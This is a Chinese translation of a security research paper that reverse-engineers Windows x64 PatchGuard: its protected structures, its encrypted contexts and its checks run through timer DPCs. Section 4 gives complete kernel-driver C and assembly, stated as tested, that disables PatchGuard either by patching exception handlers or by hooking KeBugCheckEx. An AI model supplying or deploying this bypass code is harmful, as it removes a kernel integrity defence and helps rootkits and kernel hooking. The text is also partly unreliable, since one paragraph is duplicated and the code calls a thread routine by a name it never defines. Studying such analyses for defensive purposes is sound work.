分发表现在包含相对地址数组这一事实，是打算把系统调用挂钩代码从 32 位平台移植到 x64 内核的驱动开发者必须跨越的一道障碍。解决这个相对地址问题的一个办法相当简单。在 2 GB 的可相对寻址内存中，有很多地方可以放置一个供挂钩例程使用的跳板（trampoline）。例如，符号之间常常有对齐填充。这种方法相当取巧，并且它依赖于 PatchGuard 被强制禁用这一事实。不过，也还有其他更优雅的方法可以做到这一点，两者都不需要。

就保护系统服务表而言，PatchGuard 同时保护存放在 nt!KiServiceTable 中的原生系统服务分发表，以及 nt!KeServiceDescriptorTable 结构本身。这是通过使用在系统映像一节中提到的 nt!PgCreateBlockChecksumSubContext 例程来完成的。下面的代码显示了对这两项如何调用块校验和例程：

```
PgCreateBlockChecksumSubContext(
    ParentContext,
    0,
    KeServiceDescriptorTable->DispatchTable, // KiServiceTable
    KiServiceLimit * sizeof(ULONG),
    0,
    NULL);

PgCreateBlockChecksumSubContext(
    ParentContext,
    0,
    &KeServiceDescriptorTable,
    0x20,
    0,
    NULL);
```

nt!KeServiceDescriptorTable 结构也受到保护的原因，是阻止对那个指向实际分发表的属性的修改。

##### 3.2.4) Processor MSRs / 处理器 MSR

最新、最好的处理器已大大改进了完成用户模式到内核模式转换的方法。在这些增强出现之前，包括 Windows 在内的大多数操作系统都被迫专门分配一个软中断作为系统调用向量。较新的处理器拥有专门用于分发系统调用的指令集，例如 syscall 和 sysenter 指令。这些指令的工作方式之一，是利用一个由处理器定义的、型号特定的寄存器（MSR），其中包含当收到系统调用时意在内核模式下获得控制权的例程的地址。在 x64 架构上，控制这个值的 MSR 名为 LSTAR，是 Long System Target-Address Register（长模式系统目标地址寄存器）的缩写。与这个 MSR 关联的代码是 0xc0000082。在启动期间，x64 内核把这个 MSR 初始化为 nt!KiSystemCall64。

为了阻止第三方通过改变 LSTAR MSR 的值来挂钩系统调用，PatchGuard 创建了一个类型为 7 的保护子上下文来缓存该 MSR 的值。负责完成此事的例程被标记为 PgCreateMsrSubContext，其原型如下所示：

```
PPATCHGUARD_SUB_CONTEXT PgCreateMsrSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext,
    IN UCHAR Processor);
```

与 GDT/IDT 保护一样，LSTAR MSR 的值必须按每个处理器分别获得，因为 MSR 值天生就存放在单个处理器上。为支持这一点，该例程在一个遍历所有处理器的循环上下文中被调用，并传入它要读取的处理器标识符。为了确保从正确的处理器获得 MSR 值，PatchGuard 使用 nt!KeSetAffinityThread 使调用线程运行在适当的处理器上。

##### 3.2.5) Debug Routines / 调试例程

PatchGuard 创建了一个特殊的子上下文（类型 6），用于保护内核内部用于调试目的的一些例程。这些例程，例如 nt!KdpStub，意在用作一种机制：让附着的调试器在允许内核分发异常之前先处理该异常。nt!KdpStub（原文此处误作 bt!KdpStub）由 nt!KiDispatchException 通过全局变量 nt!KiDebugRoutine 间接调用。初始化这些例程的保护子上下文的例程被标记为 nt!PgCreateDebugRoutineSubContext，其原型如下所示：

```
PPATCHGUARD_SUB_CONTEXT PgCreateDebugRoutineSubContext(
    IN PPATCHGUARD_CONTEXT ParentContext);
```

看来该子上下文结构被初始化为指向 nt!KdpStub、nt!KdpTrap 和 nt!KiDebugRoutine 的指针。看来这个子上下文意在保护第三方驱动不把 nt!KiDebugRoutine 修改为指向别处。也可能还有其他意图。

#### 3.3) Obfuscating the PatchGuard Contexts / 混淆 PatchGuard 上下文

为了让在内存中定位 PatchGuard 上下文更具挑战性，每个上下文都用一个随机生成的 64 位密钥做 XOR 处理。这是通过调用被标记为 nt!PgEncryptContext 的函数来完成的，该函数就地对所提供的上下文缓冲区做 XOR，然后返回用于加密它的 XOR 密钥。这个函数的原型如下所示：

```
ULONG64 PgEncryptContext(
    IN OUT PPATCHGUARD_CONTEXT Context);
```

在 nt!KiInitializePatchGuard 初始化了所有单独的子上下文之后，它做的下一件事是加密主 PatchGuard 上下文。为此，它首先在栈上制作该上下文的一份副本，以便在加密之后仍能以明文形式引用它。需要明文副本的原因是，校验例程需要被排队执行，而要做到这一点，就必须引用上下文结构的某些属性。这一点将在下一节中详细讨论。副本创建之后，调用 nt!PgEncryptContext，把主 PatchGuard 上下文作为第一个参数传入。一旦校验例程已被排队执行，明文副本就不再需要，并被重新置零，以确保不留下任何明文引用。下面的伪代码说明了这一行为：

```
PATCHGUARD_CONTEXT LocalCopy;
ULONG64 XorKey;

memmove(
    &LocalCopy,
    Context,
    sizeof(PATCHGUARD_CONTEXT)); // 0x1b8

XorKey = PgEncryptContext(
    Context);

... Use LocalCopy for verification routine queuing ...
（…使用 LocalCopy 来排队校验例程…）

memset(
    &LocalCopy,
    0,
    sizeof(LocalCopy));
```

#### 3.4) Executing the PatchGuard Verification Routine / 执行 PatchGuard 校验例程

收集校验和、缓存关键结构的值固然很好，但如果没有办法对它进行校验，那就毫无意义。为此，PatchGuard 竭尽全力让校验例程的执行尽可能隐蔽。这是通过使用误导和混淆来实现的。

在所有子上下文都初始化完毕之后、但在加密主上下文之前，nt!KiInitializePatchGuard 执行其较为关键的操作之一。在这个阶段，将间接用于处理 PatchGuard 校验的例程，从一个函数指针数组中随机选出，并存放在主 PatchGuard 上下文中偏移 0x168 处。在数组中找到的这些函数有一个非常特殊的目的，稍后将在本节中更详细地讨论。现在，先记住一个校验例程已经被选出这一事实。

选好校验例程之后，主 PatchGuard 上下文按上一节所述被加密。加密完成之后，初始化一个定时器，它使用一个在 PatchGuard 初始化过程早期由 nt!KiInitializePatchGuard 分配的子上下文。定时器通过调用 nt!KeInitializeTimer 来初始化，其中传入的指向定时器结构的指针实际上是先前分配的子上下文结构的一部分。紧跟在已初始化定时器结构之后的内存中、偏移 0x88 处，是字值 0x1131。反汇编时，这两个字节翻译为一条 xor [rcx], edx 指令。如果仔细查看 nt!CmpAppendDllSection 的前两个字节，就会看到它的第一条指令恰好由那两个字节构成。虽然在此刻并不重要，但稍后可能有用。

定时器结构初始化之后，PatchGuard 通过调用一个被标记为 nt!PgInitializeTimer 的函数，开始把定时器排队执行的过程，其原型如下所示：

```
VOID PgInitializeTimer(
    IN PPATCHGUARD_CONTEXT Context,
    IN PVOID EncryptedContext,
    IN ULONG64 XorKey,
    IN ULONG UnknownZero);
```

在 nt!PgInitializeTimer 例程内部，发生了一些奇怪的事情。首先，初始化一个 DPC（Deferred Procedure Call，延迟过程调用），它使用本节前面所述的随机选出的校验例程作为 DeferredRoutine（延迟例程）。然后，作为参数传入的 EncryptedContext 指针与 XorKey 参数做 XOR，产生一个完全虚假的指针，该指针作为 DeferredContext 参数传给 nt!KeInitializeDpc。最终结果是看上去像这样的伪代码：

```
KeInitializeDpc(
    &Dpc,
    Context->TimerDpcRoutine,
    EncryptedContext ^ ~(XorKey << UnknownZero));
```

DPC 初始化之后，调用 nt!KeSetTimer 把该 DPC 排队等待执行。DueTime 参数是随机生成的，以使其更难被特征匹配（signature），同时有一个确定的上限，以确保它在一个合理的时间范围内被执行。设置定时器之后，nt!PgInitializeTimer 返回给调用者。

定时器初始化并设置为执行之后，nt!KiInitializePatchGuard 就完成了它的操作并返回到 nt!KiFilterFiberContext。引发整个初始化过程的除法错误故障被纠正，执行恢复到 nt!KiDivide6432 中 div 指令之后的指令，从而允许内核正常启动。

不过，这只是乐趣的一半。现在真正的问题是校验例程如何被执行。显而易见，它与设置定时器时使用的 DPC 例程有关，所以最合乎逻辑的查看地点就在那里。回想本节前面所述，nt!KiInitializePatchGuard 从一个例程数组中随机选出一个校验例程地址。这个数组可以通过查看 PatchGuard 初始化例程的这段反汇编找到：

```
nt!KiDivide6432+0xec3:
fffff800`01423e74 8bc1             mov     eax,ecx
fffff800`01423e76 488d0d83c1bdff   lea     rcx,[nt]
fffff800`01423e7d 488b84c128044300 mov     rax,[rcx+rax*8+0x430428]
```

同样，这里使用了与隐藏池标签数组相同的混淆技术。把 0x430428 加到 nt 的基址上，DPC 例程数组就显露出来了：

```
lkd> dqs nt+0x430428 L3
fffff800`01430428  fffff800`01033b10 nt!KiScanReadyQueues
fffff800`01430430  fffff800`011010e0 nt!ExpTimeRefreshDpcRoutine
fffff800`01430438  fffff800`0101dd10 nt!ExpTimeZoneDpcRoutine
```

这告诉了我们 PatchGuard 可能使用的 DPC 例程的可能排列组合，但并没有告诉我们这实际上如何导致保护上下文的校验。合乎逻辑的下一步，是试图基于传递给它的 DeferredContext 来理解这些例程之一如何运作，因为从 nt!PgInitializeTimer 可知，DeferredContext 参数将指向与一个加密密钥做了 XOR 的 PatchGuard 上下文。在这三个例程中，nt!ExpTimeRefreshDpcRoutine 最容易理解。该函数前几条指令的反汇编如下所示：

```
lkd> u nt!ExpTimeRefreshDpcRoutine
nt!ExpTimeRefreshDpcRoutine:
fffff800`011010e0 48894c2408       mov     [rsp+0x8],rcx
fffff800`011010e5 4883ec68         sub     rsp,0x68
fffff800`011010e9 b801000000       mov     eax,0x1
fffff800`011010ee 0fc102           xadd    [rdx],eax
fffff800`011010f1 ffc0             inc     eax
fffff800`011010f3 83f801           cmp     eax,0x1
```

延迟例程的原型是：第一个参数是与其关联的 DPC 的指针，第二个参数是 DeferredContext 指针。x64 调用约定告诉我们，这等价于 rcx 指向 DPC 结构、rdx 指向 DeferredContext 指针。但这里有一个问题。该函数的第四条指令试图对 DeferredContext 的第一部分执行一条 xadd。如前所述，传给 DPC 例程的 DeferredContext 是一个指针与 XOR 运算的结果，产生一个完全虚假的指针。这应该意味着机器一解引用该指针就会立即崩溃，对吗？答案显然是否定的，而这里又出现了另一个误导案例。

事实是，nt!ExpTimeRefreshDpcRoutine、nt!ExpTimeZoneDpcRoutine 和 nt!KiScanReadyQueues 都是完全合法的例程，与 PatchGuard 本身没有任何直接关系。相反，它们被用作间接执行那些确实与 PatchGuard 有关的代码的手段。这三个例程的独特之处在于，它们三个都会在某个时刻解引用其 DeferredContext 指针，如下所示：

```
lkd> u fffff800`01033b43 L1
nt!KiScanReadyQueues+0x33:
fffff800`01033b43 8b02             mov     eax,[rdx]
lkd> u fffff800`0101dd1e L1
nt!ExpTimeZoneDpcRoutine+0xe:
fffff800`0101dd1e 0fc102           xadd    [rdx],eax
```

当 DeferredContext 操作发生时，会引发一个一般保护故障（General Protection Fault）异常，并被传递给 nt!KiGeneralProtectionFault。这个例程随后最终导致与触发故障的例程（例如 nt!ExpTimeRefreshDpcRoutine）相关联的异常处理程序被执行。在 x64 上，异常处理代码与大多数人在 32 位上习惯的完全不同。函数不是在运行时注册异常处理程序，而是每个函数在编译时指定其异常处理程序，其方式允许通过一个标准化 API 例程（例如 nt!RtlLookupFunctionEntry）来查找它们。这个 API 例程返回关于该函数的、存放在 RUNTIME_FUNCTION 结构中的信息，其中最重要的是展开信息（unwind information）。展开信息包括异常处理程序的地址（如果有的话）。虽然这大体上超出本文范围，但人们可以通过在调试器中执行以下操作来确定 nt!ExpTimeRefreshDpcRoutine 的异常处理程序的地址：

```
lkd> .fnent nt!ExpTimeRefreshDpcRoutine
Debugger function entry 00000000`01cdaa4c for:
(fffff800`011010e0)   nt!ExpTimeRefreshDpcRoutine   |
(fffff800`011011d0)   nt!ExpCenturyDpcRoutine
Exact matches:
    nt!ExpTimeRefreshDpcRoutine = <no type information>

BeginAddress      = 00000000`001010e0
EndAddress        = 00000000`0010110d
UnwindInfoAddress = 00000000`00131274
lkd> u nt + dwo(nt + 00131277 + (by(nt + 00131276) * 2) + 13)
nt!ExpTimeRefreshDpcRoutine+0x40:
fffff800`01101120 8bc0             mov     eax,eax
fffff800`01101122 55               push    rbp
fffff800`01101123 4883ec30         sub     rsp,0x30
fffff800`01101127 488bea           mov     rbp,rdx
fffff800`0110112a 48894d50         mov     [rbp+0x50],rcx
```

更仔细地查看这个异常处理程序，可以看到它在某个条件下发出对 nt!KeBugCheckEx 的调用，错误检查代码为 0x109。这个错误检查代码正是 PatchGuard 用来指示一个关键结构已被篡改的代码，所以这是一个非常好的迹象，表明这个异常处理程序至少全部或部分与 PatchGuard 有关。

这三个例程各自的异常处理程序大致等价，执行相同的操作。如果 DeferredContext 没有被意外篡改，那么这些异常处理程序最终会调用保护上下文中那份从 INITKDB（原文如此，应为 INITKDBG）复制来的代码，特别是 nt!FsRtlUninitializeSmallMcb。这个例程调用名为 nt!FsRtlMdlReadCompleteDevEx 的符号，而它实际上负责调用各个子上下文校验例程。

#### 3.5) Reporting Verification Inconsistencies / 报告校验不一致

在 PatchGuard 检测到一个关键结构已被修改的情况下，它会调用名为 nt!SdpCheckDll 的符号的代码复制版本，参数随后将通过存放在 PatchGuard 上下文中的函数表传给 nt!KeBugCheckEx。nt!SdbpCheckDll（原文前后拼写不一）的目的是在跳转到 nt!KeBugCheckEx 之前，把当前帧之前的栈和所有寄存器清零。据推测，这样做是为了试图使第三方驱动不可能检测到错误检查报告并从中恢复。如果所有检查都按计划进行且不存在不一致，该例程会创建一个新的 PatchGuard 上下文，并使用第一次被选中的同一个例程再次设置定时器。

### 4) Bypass Approaches / 绕过方法

在解释了 PatchGuard 如何运作的最关键方面之后，下一个目标是试图看看是否存在任何可以绕过它所提供的保护机制的方法。这将需要禁用校验例程，或者欺骗校验例程。虽然有许多显而易见的方法，例如创建一个在 PatchGuard 初始化之前运行的自定义引导加载程序，或者通过修改 ntoskrnl.exe 来完全排除其初始化向量，但本章讨论的方法旨在可在真实世界环境中使用，无需求助于侵入性操作，也无需重启机器。事实上，首要目标是创建一个单独的独立函数、或几个函数，可以把它们放入设备驱动中，让驱动只需调用一个例程就能禁用 PatchGuard 保护，从而驱动现有的挂钩关键结构的方法仍能被使用。

重要的是要注意，这里列出的一些方法尚未经过测试，只是理论性的。那些已经过测试的将被注明。在深入具体的绕过方法之前，同样重要的是考虑在运行时禁用 PatchGuard 的通用技术。首先，必须考虑校验例程是如何被设置运行的，以及它依赖什么来完成校验。在这里，校验例程被设置为在一个定时器的上下文中运行，该定时器与一个 DPC 相关联，该 DPC 从一个系统工作线程运行，最终导致一个异常处理程序被调用。所用的 DPC 例程是从一个小函数池中随机选出的，定时器对象被赋予一个随机的 DueTime，努力使其更难被检测。

除了校验向量之外，还已知当 PatchGuard 遇到不一致时，它会以一个特定的错误检查代码调用 nt!KeBugCheckEx，试图使系统崩溃。这些理解上的点滴，使人们能够考虑范围广泛的绕过方法。

#### 4.1) Exception Handler Hooking / 异常处理程序挂钩

既然已知校验例程间接依赖于与三个定时器 DPC 例程相关联的异常处理程序来运行代码，那么顺理成章地，也许可以改变每个异常处理程序的行为，使其简单地变成一个无操作（no-operation）。这意味着，一旦 DPC 例程执行并触发一般保护故障，异常处理程序将被调用，并将简单地不执行任何操作，而不是做校验检查。这种方法已经过测试，并已确认在当前 PatchGuard 实现上有效。

完成此事所采取的方法是，首先找到已知与 PatchGuard 相关联的例程列表。就目前而言，该列表只包含三个函数，但将来该列表可能会改变。定位例程数组之后，必须提取每个例程的异常处理程序，然后随后把它打补丁，使其返回 0x1 然后返回。下面可以找到一个实现此算法的示例函数：

```
static CHAR CurrentFakePoolTagArray[] =
    "AcpSFileIpFIIrp MutaNtFsNtrfSemaTCPc";

NTSTATUS DisablePatchGuard() {
    UNICODE_STRING SymbolName;
    NTSTATUS       Status = STATUS_SUCCESS;
    PVOID *        DpcRoutines = NULL;
    PCHAR          NtBaseAddress = NULL;
    ULONG          Offset;

    RtlInitUnicodeString(
            &SymbolName,
            L"__C_specific_handler");

    do
    {
        //
        // Get the base address of nt
        //
        if (!RtlPcToFileHeader(
                MmGetSystemRoutineAddress(&SymbolName),
                (PCHAR *)&NtBaseAddress))
        {
            Status = STATUS_INVALID_IMAGE_FORMAT;
            break;
        }

        //
        // Search the image to find the first occurrence of:
        //
        //    "AcpSFileIpFIIrp MutaNtFsNtrfSemaTCPc"
        //
        // This is the fake tag pool array that is used to allocate protection
        // contexts.
        //
        __try
        {
            for (Offset = 0;
                 !DpcRoutines;
                 Offset += 4)
            {
                //
                // If we find a match for the fake pool tag array, the DPC routine
                // addresses will immediately follow.
                //
                if (memcmp(
                        NtBaseAddress + Offset,
                        CurrentFakePoolTagArray,
                        sizeof(CurrentFakePoolTagArray) - 1) == 0)
                    DpcRoutines = (PVOID *)(NtBaseAddress +
                            Offset + sizeof(CurrentFakePoolTagArray) + 3);
            }

        } __except(EXCEPTION_EXECUTE_HANDLER)
        {
            //
            // If an exception occurs, we failed to find it.  Time to bail out.
            //
            Status = GetExceptionCode();
            break;
        }

        DebugPrint(("DPC routine array found at %p.",
                DpcRoutines));

        //
        // Walk the DPC routine array.
        //
        for (Offset = 0;
             DpcRoutines[Offset] && NT_SUCCESS(Status);
             Offset++)
        {
            PRUNTIME_FUNCTION Function;
            ULONG64           ImageBase;
            PCHAR             UnwindBuffer;
            UCHAR             CodeCount;
            ULONG             HandlerOffset;
            PCHAR             HandlerAddress;
            PVOID             LockedAddress;
            PMDL              Mdl;

            //
            // If we find no function entry, then go on to the next entry.
            //
            if ((!(Function = RtlLookupFunctionEntry(
                    (ULONG64)DpcRoutines[Offset],
                    &ImageBase,
                    NULL))) ||
                (!Function->UnwindData))
            {
                Status = STATUS_INVALID_IMAGE_FORMAT;
                continue;
            }

            //
            // Grab the unwind exception handler address if we're able to find one.
            //
            UnwindBuffer  = (PCHAR)(ImageBase + Function->UnwindData);
            CodeCount     = UnwindBuffer[2];

            //
            // The handler offset is found within the unwind data that is specific
            // to the language in question.  Specifically, it's +0x10 bytes into
            // the structure not including the UNWIND_INFO structure itself and any
            // embedded codes (including padding).  The calculation below accounts
            // for all these and padding.
            //
            HandlerOffset = *(PULONG)((ULONG64)(UnwindBuffer + 3 + (CodeCount * 2) + 20) & ~3);

            //
            // Calculate the full address of the handler to patch.
            //
            HandlerAddress = (PCHAR)(ImageBase + HandlerOffset);

            DebugPrint(("Exception handler for %p found at %p (unwind %p).",
                    DpcRoutines[Offset],
                    HandlerAddress,
                    UnwindBuffer));

            //
            // Finally, patch the routine to simply return with 1.  We'll patch
            // with:
            //
            // 6A01 push byte 0x1
            // 58   pop eax
            // C3   ret
            //

            //
            // Allocate a memory descriptor for the handler's address.
            //
            if (!(Mdl = MmCreateMdl(
                    NULL,
                    (PVOID)HandlerAddress,
                    4)))
            {
                Status = STATUS_INSUFFICIENT_RESOURCES;
                continue;
            }

            //
            // Construct the Mdl and map the pages for kernel-mode access.
            //
            MmBuildMdlForNonPagedPool(
                    Mdl);

            if (!(LockedAddress = MmMapLockedPages(
                    Mdl,
                    KernelMode)))
            {
                IoFreeMdl(
                        Mdl);

                Status = STATUS_ACCESS_VIOLATION;
                continue;
            }

            //
            // Interlocked exchange the instructions we're overwriting with.
            //
            InterlockedExchange(
                    (PLONG)LockedAddress,
                    0xc358016a);

            //
            // Unmap and destroy the MDL
            //
            MmUnmapLockedPages(
                    LockedAddress,
                    Mdl);

            IoFreeMdl(
                    Mdl);
        }

    } while (0);

    return Status;
}
```

这种方法的好处包括：它体积小、相对简单。如果某些东西发生变化，它也相当容错。然而，它的一些缺点包括：它依赖于池标签数组紧挨着位于 DPC 例程地址数组之前，而且它还依赖于池标签数组是一个固定值。微软完全有可能在将来消除这一假设。出于这些原因，在生产驱动中最好不要使用这种方法，但它至少足以用于演示目的。

为了让微软破坏这种方法，他们将不得不使该方法所做的某些假设变得不可靠。例如，DPC 例程数组可以被移到一个不紧跟在池标签数组之后的位置。这意味着该例程将不得不硬编码或以其他方式推导出 PatchGuard 所用的 DPC 例程数组。另一个选择是把池标签数组拆分开，使它不是一个可以轻易搜索到的浓缩字符串。实际上，阻止这种方法可靠实现的相对复杂程度是相当小的。

这种方法的好处包括：它体积小、相对简单易懂。如果某些东西发生变化，它也相当容错。然而，它的一些缺点包括：它依赖于池标记数组紧挨着位于 DPC 例程地址数组之前，而且它还依赖于池标记数组是一个固定值。微软在未来完全有可能消除这一假设。出于这些原因，在生产驱动程序中最好不要使用这种方法，但它至少足够适合演示目的。

为了让微软破坏这种方法，他们必须使该方法所做的某些假设变得不可靠。例如，DPC 例程数组可以被移动到一个并不紧跟在池标记数组之后的位置。这意味着该例程将不得不硬编码或以其他方式推导出 PatchGuard 使用的 DPC 例程数组。另一个选择是把池标记数组拆开，使它不是一个容易搜索的浓缩字符串。实际上，阻止这种方法被可靠实现的相对复杂程度是相当小的。

#### 4.2) KeBugCheckEx Hook / KeBugCheckEx 挂钩

PatchGuard 保护中一个不可避免的事实是，它必须以某种方式报告校验不一致。事实上，它报告的方式必须包含关闭机器，以阻止第三方厂商在检测到补丁之后仍能继续运行代码。就目前而言，完成此事所采取的方法，是通过 nt!KeBugCheckEx 发出一个符号代码为 0x109 的错误检查。采取这条路线，是为了让最终用户知道发生了什么，而不至于在机器突然关机或重启且没有任何解释时被蒙在鼓里、真的陷入黑暗。

作者在思考绕过技术时想到的第一个主意，是试图让 nt!KeBugCheckEx 返回到调用者的调用者帧（caller's caller frame）。这样做是必要的，因为你不能返回到调用者，因为编译器通常会在对 nt!KeBugCheckEx 的调用之后立即插入一个调试器陷阱。然而，也许有可能返回到调用者的调用者的帧。换句话说，就是那个调用了导致 nt!KeBugCheckEx 被调用的函数的例程。然而，如本文前面所述，PatchGuard 代码小心翼翼地确保在调用 nt!KeBugCheckEx 之前把栈清零。这实际上消除了栈上可能用于返回父帧的任何上下文引用。这样一来，nt!KeBugCheckEx 挂钩向量似乎是一条死路。恰恰相反，并非如此。

一种可以采取的衍生方法，不必担心存放在寄存器中或栈上的上下文，它利用了这样一个事实：每个线程都保留着自己的入口点地址。对于系统工作线程，入口点通常指向像 nt!ExpWorkerThread 这样的例程。由于会生成多个工作线程，传给线程的上下文参数无关紧要，因为工作线程实际上只是被用来处理工作项和使 DPC 例程到期。心中有了这一事实，这种方法就归结为：挂钩 nt!KeBugCheckEx，并检测是否传入了错误检查代码 0x109。如果没有，则可以调用原始的 nt!KeBugCheckEx 例程。然而，如果是 0x109，那么可以通过把调用线程的栈指针恢复为其栈限（stack limit）减 8，然后跳转到该线程的 StartAddress 来重新启动该线程。最终结果是，该线程像正常情况一样回去处理工作项和使 DPC 例程到期。

虽然一种更显而易见的方法是简单地终止调用线程，但这样做是不可能的。操作系统会跟踪系统工作线程，并会检测到某个线程退出。系统工作线程退出的行为将导致系统蓝屏——这正是所试图避免的那类事情。

下面的代码实现了上面描述的算法。它相当庞大，原因将在代码片段之后讨论：

```
== ext.asm

.data

EXTERN OrigKeBugCheckExRestorePointer:PROC
EXTERN KeBugCheckExHookPointer:PROC

.code

;
; Points the stack pointer at the supplied argument and returns to the caller.
;
public AdjustStackCallPointer
AdjustStackCallPointer PROC
    mov rsp, rcx
    xchg r8, rcx
    jmp rdx
AdjustStackCallPointer ENDP

;
; Wraps the overwritten preamble of KeBugCheckEx.
;
public OrigKeBugCheckEx
OrigKeBugCheckEx PROC
    mov [rsp+8h], rcx
    mov [rsp+10h], rdx
    mov [rsp+18h], r8
    lea rax, [OrigKeBugCheckExRestorePointer]
    jmp qword ptr [rax]
OrigKeBugCheckEx ENDP

END

== antipatch.c

//
// Both of these routines reference the assembly code described
// above
//
extern VOID OrigKeBugCheckEx(
        IN ULONG BugCheckCode,
        IN ULONG_PTR BugCheckParameter1,
        IN ULONG_PTR BugCheckParameter2,
        IN ULONG_PTR BugCheckParameter3,
        IN ULONG_PTR BugCheckParameter4);
extern VOID AdjustStackCallPointer(
        IN ULONG_PTR NewStackPointer,
        IN PVOID StartAddress,
        IN PVOID Argument);

//
// mov eax, ptr
// jmp eax
//
static CHAR HookStub[] =
"\x48\xb8\x41\x41\x41\x41\x41\x41\x41\x41\xff\xe0";

//
// The offset into the ETHREAD structure that holds the start routine.
//
static ULONG ThreadStartRoutineOffset = 0;

//
// The pointer into KeBugCheckEx after what has been overwritten by the hook.
//
PVOID OrigKeBugCheckExRestorePointer;

VOID KeBugCheckExHook(
        IN ULONG BugCheckCode,
        IN ULONG_PTR BugCheckParameter1,
        IN ULONG_PTR BugCheckParameter2,
        IN ULONG_PTR BugCheckParameter3,
        IN ULONG_PTR BugCheckParameter4)
{
    PUCHAR LockedAddress;
    PCHAR  ReturnAddress;
    PMDL   Mdl = NULL;


    //
    // Call the real KeBugCheckEx if this isn't the bug check code we're looking
    // for.
    //
    if (BugCheckCode != 0x109)
    {
        DebugPrint(("Passing through bug check %.4x to %p.",
                BugCheckCode,
                OrigKeBugCheckEx));

        OrigKeBugCheckEx(
                BugCheckCode,
                BugCheckParameter1,
                BugCheckParameter2,
                BugCheckParameter3,
                BugCheckParameter4);
    }
    else
    {
        PCHAR CurrentThread = (PCHAR)PsGetCurrentThread();
        PVOID StartRoutine  = *(PVOID **)(CurrentThread + ThreadStartRoutineOffset);
        PVOID StackPointer  = IoGetInitialStack();

        DebugPrint(("Restarting the current worker thread %p at %p (SP=%p, off=%lu).",
                PsGetCurrentThread(),
                StartRoutine,
                StackPointer,
                ThreadStartRoutineOffset));

        //
        // Shift the stack pointer back to its initial value and call the routine.  We
        // subtract eight to ensure that the stack is aligned properly as thread
        // entry point routines would expect.
        //
        AdjustStackCallPointer(
                (ULONG_PTR)StackPointer - 0x8,
                StartRoutine,
                NULL);
    }

    //
    // In either case, we should never get here.
    //
    __debugbreak();
}
VOID DisablePatchProtectionSystemThreadRoutine(
        IN PVOID Nothing)
{
    UNICODE_STRING SymbolName;
    NTSTATUS       Status = STATUS_SUCCESS;
    PUCHAR         LockedAddress;
    PUCHAR         CurrentThread = (PUCHAR)PsGetCurrentThread();
    PCHAR          KeBugCheckExSymbol;
    PMDL           Mdl = NULL;


    RtlInitUnicodeString(
            &SymbolName,
            L"KeBugCheckEx");

    do
    {
        //
        // Find the thread's start routine offset.
        //
        for (ThreadStartRoutineOffset = 0;
             ThreadStartRoutineOffset < 0x1000;
             ThreadStartRoutineOffset += 4)
        {
            if (*(PVOID **)(CurrentThread +
                    ThreadStartRoutineOffset) == (PVOID)DisablePatchProtection2SystemThreadRoutine)
                break;
        }

        DebugPrint(("Thread start routine offset is 0x%.4x.",
                ThreadStartRoutineOffset));

        //
        // If we failed to find the start routine offset for some strange reason,
        // then return not supported.
        //
        if (ThreadStartRoutineOffset >= 0x1000)
        {
            Status = STATUS_NOT_SUPPORTED;
            break;
        }

        //
        // Get the address of KeBugCheckEx.
        //
        if (!(KeBugCheckExSymbol = MmGetSystemRoutineAddress(
                &SymbolName)))
        {
            Status = STATUS_PROCEDURE_NOT_FOUND;
            break;
        }

        //
        // Calculate the restoration pointer.
        //
        OrigKeBugCheckExRestorePointer = (PVOID)(KeBugCheckExSymbol + 0xf);

        //
        // Create an initialize the MDL.
        //
        if (!(Mdl = MmCreateMdl(
                NULL,
                (PVOID)KeBugCheckExSymbol,
                0xf)))
        {
            Status = STATUS_INSUFFICIENT_RESOURCES;
            break;
        }

        MmBuildMdlForNonPagedPool(
                Mdl);

        //
        // Probe & Lock.
        //
        if (!(LockedAddress = (PUCHAR)MmMapLockedPages(
                Mdl,
                KernelMode)))
        {
            IoFreeMdl(
                    Mdl);

            Status = STATUS_ACCESS_VIOLATION;
            break;
        }

        //
        // Set the aboslute address to our hook.
        //
        *(PULONG64)(HookStub + 0x2) = (ULONG64)KeBugCheckExHook;

        DebugPrint(("Copying hook stub to %p from %p (Symbol %p).",
                LockedAddress,
                HookStub,
                KeBugCheckExSymbol));

        //
        // Copy the relative jmp into the hook routine.
        //
        RtlCopyMemory(
                LockedAddress,
                HookStub,
                0xf);

        //
        // Cleanup the MDL.
        //
        MmUnmapLockedPages(
                LockedAddress,
                Mdl);

        IoFreeMdl(
                Mdl);

    } while (0);
}

//
// A pointer to KeBugCheckExHook
//
PVOID KeBugCheckExHookPointer = KeBugCheckExHook;

NTSTATUS DisablePatchProtection() {
    OBJECT_ATTRIBUTES Attributes;
    NTSTATUS          Status;
    HANDLE            ThreadHandle = NULL;

    InitializeObjectAttributes(
            &Attributes,
            NULL,
            OBJ_KERNEL_HANDLE,
            NULL,
            NULL);

    //
    // Create the system worker thread so that we can automatically find the
    // offset inside the ETHREAD structure to the thread's start routine.
    //
    Status = PsCreateSystemThread(
            &ThreadHandle,
            THREAD_ALL_ACCESS,
            &Attributes,
            NULL,
            NULL,
            DisablePatchProtectionSystemThreadRoutine,
            NULL);

    if (ThreadHandle)
        ZwClose(
                ThreadHandle);

    return Status;
}
```

这种方法已经过测试，并已证实对本文写作时当前版本的 PatchGuard 有效。这种方法优于其他方法的好处是，它不依赖任何未导出的依赖项或特征，它具有零性能开销（因为除非机器要崩溃，否则 nt!KeBugCheckEx 从不被调用），并且它不受竞态条件的影响。作者所知的它唯一的主要缺点是，它依赖于系统工作线程的行为保持不变——就以 NULL 上下文将执行恢复到线程入口点是安全的而言。迄今为止，人们假设这将继续是一个安全的赌注。

为了消除这种方法作为一种可能的绕过技术，微软可以做几件事中的一件。首先，他们可以创建一个新的保护子上下文，存放 nt!KeBugCheckEx 及其所调用函数的校验和。如果检测到 nt!KeBugCheckEx 已被篡改，PatchGuard 可以在不调用任何外部函数的情况下进行硬重启（hard reboot）。虽然这是一种不太理想的行为，但它似乎是微软能可靠解决这一问题的少数几种方法之一。任何其他依赖于调用可在确定性地址找到的外部函数的方法，都会为类似的绕过技术提供机会。

第二种不太有用的方法是，在调用 nt!KeBugCheckEx 之前，把线程结构中的某些字段清零。虽然这将阻止上述方法起作用，但它肯定不会阻止另一种（也许或多或少取巧的）方法起作用。所需要的只是能够让工作线程返回其处理排队工作项的正常运作。

#### 4.3) Finding the Timer / 找到定时器

